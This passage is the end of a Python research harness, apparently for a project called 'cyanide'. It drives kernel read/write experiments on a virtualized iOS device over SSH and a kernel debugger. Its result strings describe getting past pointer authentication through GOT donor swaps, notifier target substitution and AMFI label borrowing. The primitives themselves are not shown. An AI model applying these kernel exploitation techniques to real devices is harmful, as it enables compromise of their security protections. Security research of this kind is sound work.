            "the callee returned the chosen EINPROGRESS marker and every "
            "temporary field was restored without provider kcall."
        )
    elif args.ifnet_check_multi_pac_canary:
        conclusion = (
            "KRW changed the exclusive raw ether_check_multi GOT donor, "
            "the stock IOEthernetInterface initializer signed the chosen "
            "target under IA/0xe4fe into a new ifnet, the GOT was restored, "
            "and SIOCADDMULTI executed that persisted target without "
            "provider kcall."
        )
    elif args.notification_target_swap:
        conclusion = (
            "KRW-only reversible target substitution made an otherwise "
            "nonmatching IOServiceUserNotification receive the newly "
            "published IOUserEthernetInterface through the stock signed "
            "61de action, without provider kcall."
        )
    elif args.notification_block_canary:
        conclusion = (
            "KRW-only reversible notifier mutation survived the stock "
            "61de block adapter, hit the address-authenticated no-op block "
            "invoke under a one-shot KDP breakpoint, and restored both "
            "notifier fields without provider kcall."
        )
    elif args.notification_sandbox_canary:
        conclusion = (
            "KRW-only reversible notifier mutation dispatched the Sandbox "
            "IA-zero callback bridge with x0 equal to the newly published "
            "IOService, then restored action and target without provider "
            "kcall."
        )
    elif args.notification_2abe_73d8_canary:
        conclusion = (
            "KRW-only reversible notifier and registry mutation crossed "
            "IA/0x2abe into a fixed IA/0x73d8 adapter, hit a signed ret "
            "under KDP, and restored every changed field without provider "
            "kcall."
        )
    elif args.sysctl_pac_census:
        conclusion = (
            "Read-only KRW classified five conditional sysctl OIDs by live "
            "list membership and handler PAC state without kernel writes or "
            "provider kcall."
        )
    else:
        conclusion = (
            "KRW-only reversible AMFI-label borrowing reached the normal "
            "IOUserEthernet interface-creation signer path without kcall."
        )
    observation = {
        "schema": "com.zeroxjf.cyanide.iouserethernet-krw-observation",
        "schemaVersion": 1,
        "classification": "vm-runtime-observed",
        "kernelUUID": kernel_uuid,
        "debuggerLoadAddress": kernel_address,
        "kernelBase": result["observedKernelBase"],
        "triggerSHA256": digest,
        "result": result,
        "conclusion": conclusion,
    }
    if witness is not None:
        observation["kdpWitness"] = witness
    return observation


def parser() -> argparse.ArgumentParser:
    result = argparse.ArgumentParser(description=__doc__)
    result.add_argument("--host", required=True)
    result.add_argument("--port", type=int, default=22222)
    result.add_argument("--user", default="root")
    result.add_argument("--known-hosts", type=Path,
                        default=DEFAULT_KNOWN_HOSTS)
    result.add_argument("--password-env", default="CND_VPHONE_ROOT_PASSWORD")
    kernel = result.add_mutually_exclusive_group(required=True)
    kernel.add_argument("--kernel-debug-port", type=int)
    kernel.add_argument("--kernel-address")
    result.add_argument("--hold", type=int, default=0, choices=range(0, 301),
                        metavar="SECONDS")
    notification = result.add_mutually_exclusive_group()
    notification.add_argument(
        "--notification-target-swap", action="store_true"
    )
    notification.add_argument(
        "--notification-block-canary", action="store_true"
    )
    notification.add_argument(
        "--notification-sandbox-canary", action="store_true"
    )
    notification.add_argument(
        "--notification-2abe-73d8-canary", action="store_true"
    )
    notification.add_argument(
        "--ifnet-check-multi-pac-canary", action="store_true"
    )
    notification.add_argument(
        "--ifnet-kcall1-pac-canary", action="store_true"
    )
    notification.add_argument(
        "--sysctl-pac-census", action="store_true"
    )
    result.add_argument("--output", type=Path)
    return result


def main() -> int:
    args = parser().parse_args()
    write_json(args.output, run_live(args))
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except LabError as error:
        print(f"error: {error}", file=__import__("sys").stderr)
        raise SystemExit(1)
